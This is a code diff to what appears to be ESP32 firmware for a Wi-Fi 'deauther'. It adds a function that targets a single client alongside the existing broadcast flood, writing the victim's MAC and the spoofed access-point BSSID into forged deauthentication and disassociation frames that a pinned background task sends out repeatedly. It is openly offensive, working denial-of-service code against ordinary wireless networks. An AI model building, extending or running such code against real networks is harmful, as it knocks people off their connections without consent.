@@ -62,7 +62,9 @@ static void deauth_task(void *)
     vTaskDelete(nullptr);
 }
 
-bool deauther_start(const uint8_t bssid[6], uint8_t channel)
+// Shared start: addr1 (dst) is the broadcast address for a whole-AP flood, or a
+// single client MAC to knock ONE station off without touching the others.
+static bool start_common(const uint8_t dst[6], const uint8_t bssid[6], uint8_t channel)
 {
     if (s_run) return true;
 
@@ -70,7 +72,8 @@ bool deauther_start(const uint8_t bssid[6], uint8_t channel)
     s_channel = (channel >= 1 && channel <= 13) ? channel : 1;
     s_sent = 0;
 
-    // Stamp the BSSID into addr2/addr3 of both frame templates.
+    memcpy(s_deauth   + 4, dst,   6);   // addr1 dst (broadcast or a target client)
+    memcpy(s_disassoc + 4, dst,   6);
     memcpy(s_deauth   + 10, s_bssid, 6);
     memcpy(s_deauth   + 16, s_bssid, 6);
     memcpy(s_disassoc + 10, s_bssid, 6);
@@ -87,6 +90,17 @@ bool deauther_start(const uint8_t bssid[6], uint8_t channel)
     // never fights the LVGL/loop task on core 1 for the CPU.
     xTaskCreatePinnedToCore(deauth_task, "deauth", 4096, nullptr, 1, &s_task, 0);
     return true;
+}
+
+bool deauther_start(const uint8_t bssid[6], uint8_t channel)
+{
+    static const uint8_t bcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+    return start_common(bcast, bssid, channel);
+}
+
+bool deauther_start_client(const uint8_t client[6], const uint8_t bssid[6], uint8_t channel)
+{
+    return start_common(client, bssid, channel);
 }
 
 void deauther_stop()
